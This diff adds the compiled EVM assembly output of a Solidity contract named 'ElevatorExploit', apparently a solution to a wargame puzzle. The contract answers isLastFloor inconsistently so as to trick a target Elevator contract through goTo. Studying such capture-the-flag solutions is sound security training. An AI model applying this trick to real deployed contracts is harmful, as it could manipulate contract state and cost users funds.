@@ -1,0 +1,419 @@
+    /* "ElevatorExploit.sol":124:802  contract ArichBuilding is Building {... */
+  mstore(0x40, 0x80)
+    /* "ElevatorExploit.sol":189:191  66 */
+  0x42
+    /* "ElevatorExploit.sol":165:191  uint public lastFloor = 66 */
+  0x0
+  sstore
+    /* "ElevatorExploit.sol":249:268  bool called = false */
+  0x2
+  dup1
+  sload
+  not(mul(0xff, exp(0x2, 0xa0)))
+  and
+  swap1
+  sstore
+    /* "ElevatorExploit.sol":275:384  constructor(address _target) public {... */
+  callvalue
+    /* "--CODEGEN--":5:7   */
+  dup1
+  iszero
+  tag_1
+  jumpi
+    /* "--CODEGEN--":30:31   */
+  0x0
+    /* "--CODEGEN--":27:28   */
+  dup1
+    /* "--CODEGEN--":20:32   */
+  revert
+    /* "--CODEGEN--":5:7   */
+tag_1:
+    /* "ElevatorExploit.sol":275:384  constructor(address _target) public {... */
+  pop
+  mload(0x40)
+  0x20
+  dup1
+  bytecodeSize
+  dup4
+  codecopy
+  dup2
+  add
+  0x40
+  mstore
+  mload
+    /* "ElevatorExploit.sol":321:329  caddress */
+  0x2
+    /* "ElevatorExploit.sol":321:339  caddress = _target */
+  dup1
+  sload
+  sub(exp(0x2, 0xa0), 0x1)
+  swap1
+  swap3
+  and
+  not(sub(exp(0x2, 0xa0), 0x1))
+  swap3
+  dup4
+  and
+  dup2
+  or
+  swap1
+  swap2
+  sstore
+  0x1
+    /* "ElevatorExploit.sol":349:377  elevator = Elevator(_target) */
+  dup1
+  sload
+  swap1
+  swap3
+  and
+  or
+  swap1
+  sstore
+    /* "ElevatorExploit.sol":124:802  contract ArichBuilding is Building {... */
+  dataSize(sub_0)
+  dup1
+  dataOffset(sub_0)
+  0x0
+  codecopy
+  0x0
+  return
+stop
+
+sub_0: assembly {
+        /* "ElevatorExploit.sol":124:802  contract ArichBuilding is Building {... */
+      mstore(0x40, 0x80)
+      jumpi(tag_1, lt(calldatasize, 0x4))
+      and(div(calldataload(0x0), 0x100000000000000000000000000000000000000000000000000000000), 0xffffffff)
+      0x26a74f99
+      dup2
+      eq
+      tag_2
+      jumpi
+      dup1
+      0x58f69e07
+      eq
+      tag_3
+      jumpi
+      dup1
+      0x5f9a4bca
+      eq
+      tag_4
+      jumpi
+      dup1
+      0xb9e722cd
+      eq
+      tag_5
+      jumpi
+    tag_1:
+      0x0
+      dup1
+      revert
+        /* "ElevatorExploit.sol":165:191  uint public lastFloor = 66 */
+    tag_2:
+      callvalue
+        /* "--CODEGEN--":8:17   */
+      dup1
+        /* "--CODEGEN--":5:7   */
+      iszero
+      tag_6
+      jumpi
+        /* "--CODEGEN--":30:31   */
+      0x0
+        /* "--CODEGEN--":27:28   */
+      dup1
+        /* "--CODEGEN--":20:32   */
+      revert
+        /* "--CODEGEN--":5:7   */
+    tag_6:
+        /* "ElevatorExploit.sol":165:191  uint public lastFloor = 66 */
+      pop
+      tag_7
+      jump(tag_8)
+    tag_7:
+      0x40
+      dup1
+      mload
+      swap2
+      dup3
+      mstore
+      mload
+      swap1
+      dup2
+      swap1
+      sub
+      0x20
+      add
+      swap1
+      return
+        /* "ElevatorExploit.sol":688:800  function exploit(uint fnumber) public returns(bool) {... */
+    tag_3:
+      callvalue
+        /* "--CODEGEN--":8:17   */
+      dup1
+        /* "--CODEGEN--":5:7   */
+      iszero
+      tag_9
+      jumpi
+        /* "--CODEGEN--":30:31   */
+      0x0
+        /* "--CODEGEN--":27:28   */
+      dup1
+        /* "--CODEGEN--":20:32   */
+      revert
+        /* "--CODEGEN--":5:7   */
+    tag_9:
+      pop
+        /* "ElevatorExploit.sol":688:800  function exploit(uint fnumber) public returns(bool) {... */
+      tag_10
+      calldataload(0x4)
+      jump(tag_11)
+    tag_10:
+      0x40
+      dup1
+      mload
+      swap2
+      iszero
+      iszero
+      dup3
+      mstore
+      mload
+      swap1
+      dup2
+      swap1
+      sub
+      0x20
+      add
+      swap1
+      return
+        /* "ElevatorExploit.sol":390:682  function isLastFloor(uint _floor) payable public returns (bool)  {... */
+    tag_4:
+      tag_10
+      calldataload(0x4)
+      jump(tag_13)
+        /* "ElevatorExploit.sol":220:243  address public caddress */
+    tag_5:
+      callvalue
+        /* "--CODEGEN--":8:17   */
+      dup1
+        /* "--CODEGEN--":5:7   */
+      iszero
+      tag_14
+      jumpi
+        /* "--CODEGEN--":30:31   */
+      0x0
+        /* "--CODEGEN--":27:28   */
+      dup1
+        /* "--CODEGEN--":20:32   */
+      revert
+        /* "--CODEGEN--":5:7   */
+    tag_14:
+        /* "ElevatorExploit.sol":220:243  address public caddress */
+      pop
+      tag_15
+      jump(tag_16)
+    tag_15:
+      0x40
+      dup1
+      mload
+      0xffffffffffffffffffffffffffffffffffffffff
+      swap1
+      swap3
+      and
+      dup3
+      mstore
+      mload
+      swap1
+      dup2
+      swap1
+      sub
+      0x20
+      add
+      swap1
+      return
+        /* "ElevatorExploit.sol":165:191  uint public lastFloor = 66 */
+    tag_8:
+      sload(0x0)
+      dup2
+      jump	// out
+        /* "ElevatorExploit.sol":688:800  function exploit(uint fnumber) public returns(bool) {... */
+    tag_11:
+        /* "ElevatorExploit.sol":750:758  elevator */
+      sload(0x1)
+        /* "ElevatorExploit.sol":750:772  elevator.goTo(fnumber) */
+      0x40
+      dup1
+      mload
+      0xed9a713400000000000000000000000000000000000000000000000000000000
+      dup2
+      mstore
+      0x4
+      dup2
+      add
+      dup5
+      swap1
+      mstore
+      swap1
+      mload
+        /* "ElevatorExploit.sol":734:738  bool */
+      0x0
+      swap3
+        /* "ElevatorExploit.sol":750:758  elevator */
+      0xffffffffffffffffffffffffffffffffffffffff
+      and
+      swap2
+        /* "ElevatorExploit.sol":750:763  elevator.goTo */
+      0xed9a7134
+      swap2
+        /* "ElevatorExploit.sol":750:772  elevator.goTo(fnumber) */
+      0x24
+      dup1
+      dup4
+      add
+      swap3
+        /* "ElevatorExploit.sol":734:738  bool */
+      dup7
+      swap3
+        /* "ElevatorExploit.sol":750:772  elevator.goTo(fnumber) */
+      swap2
+      swap1
+      dup3
+      swap1
+      sub
+      add
+      dup2
+        /* "ElevatorExploit.sol":734:738  bool */
+      dup4
+        /* "ElevatorExploit.sol":750:758  elevator */
+      dup8
+        /* "ElevatorExploit.sol":750:772  elevator.goTo(fnumber) */
+      dup1
+      extcodesize
+      iszero
+        /* "--CODEGEN--":5:7   */
+      dup1
+      iszero
+      tag_18
+      jumpi
+        /* "--CODEGEN--":30:31   */
+      0x0
+        /* "--CODEGEN--":27:28   */
+      dup1
+        /* "--CODEGEN--":20:32   */
+      revert
+        /* "--CODEGEN--":5:7   */
+    tag_18:
+        /* "ElevatorExploit.sol":750:772  elevator.goTo(fnumber) */
+      pop
+      gas
+      call
+      iszero
+        /* "--CODEGEN--":8:17   */
+      dup1
+        /* "--CODEGEN--":5:7   */
+      iszero
+      tag_19
+      jumpi
+        /* "--CODEGEN--":45:61   */
+      returndatasize
+        /* "--CODEGEN--":42:43   */
+      0x0
+        /* "--CODEGEN--":39:40   */
+      dup1
+        /* "--CODEGEN--":24:62   */
+      returndatacopy
+        /* "--CODEGEN--":77:93   */
+      returndatasize
+        /* "--CODEGEN--":74:75   */
+      0x0
+        /* "--CODEGEN--":67:94   */
+      revert
+        /* "--CODEGEN--":5:7   */
+    tag_19:
+      pop
+        /* "ElevatorExploit.sol":789:793  true */
+      0x1
+      swap6
+        /* "ElevatorExploit.sol":688:800  function exploit(uint fnumber) public returns(bool) {... */
+      swap5
+      pop
+      pop
+      pop
+      pop
+      pop
+      jump	// out
+        /* "ElevatorExploit.sol":390:682  function isLastFloor(uint _floor) payable public returns (bool)  {... */
+    tag_13:
+        /* "ElevatorExploit.sol":448:452  bool */
+      0x0
+        /* "ElevatorExploit.sol":499:508  lastFloor */
+      dup1
+      sload
+        /* "ElevatorExploit.sol":448:452  bool */
+      dup2
+      swap1
+        /* "ElevatorExploit.sol":499:518  lastFloor == _floor */
+      dup4
+      eq
+        /* "ElevatorExploit.sol":498:533  (lastFloor == _floor) && (! called) */
+      dup1
+      iszero
+      tag_21
+      jumpi
+      pop
+        /* "ElevatorExploit.sol":526:532  called */
+      sload(0x2)
+      0x10000000000000000000000000000000000000000
+      swap1
+      div
+      0xff
+      and
+        /* "ElevatorExploit.sol":524:532  ! called */
+      iszero
+        /* "ElevatorExploit.sol":498:533  (lastFloor == _floor) && (! called) */
+    tag_21:
+        /* "ElevatorExploit.sol":494:653  if ((lastFloor == _floor) && (! called)) {... */
+      iszero
+      tag_22
+      jumpi
+        /* "ElevatorExploit.sol":549:555  called */
+      0x2
+        /* "ElevatorExploit.sol":549:562  called = true */
+      dup1
+      sload
+      not(0xff0000000000000000000000000000000000000000)
+      and
+      0x10000000000000000000000000000000000000000
+      or
+      swap1
+      sstore
+        /* "ElevatorExploit.sol":494:653  if ((lastFloor == _floor) && (! called)) {... */
+      jump(tag_23)
+    tag_22:
+      pop
+        /* "ElevatorExploit.sol":601:607  called */
+      0x2
+        /* "ElevatorExploit.sol":601:615  called = false */
+      dup1
+      sload
+      not(0xff0000000000000000000000000000000000000000)
+      and
+      swap1
+      sstore
+      0x1
+        /* "ElevatorExploit.sol":494:653  if ((lastFloor == _floor) && (! called)) {... */
+    tag_23:
+        /* "ElevatorExploit.sol":669:675  retval */
+      swap3
+        /* "ElevatorExploit.sol":390:682  function isLastFloor(uint _floor) payable public returns (bool)  {... */
+      swap2
+      pop
+      pop
+      jump	// out
+        /* "ElevatorExploit.sol":220:243  address public caddress */
+    tag_16:
+      and(0xffffffffffffffffffffffffffffffffffffffff, sload(0x2))
+      dup2
+      jump	// out
+
+    auxdata: 0xa165627a7a7230582048a1d9df6a316d379dc727b27ae968600c2300f0f580ef8a2a8976d47316b5840029
+}
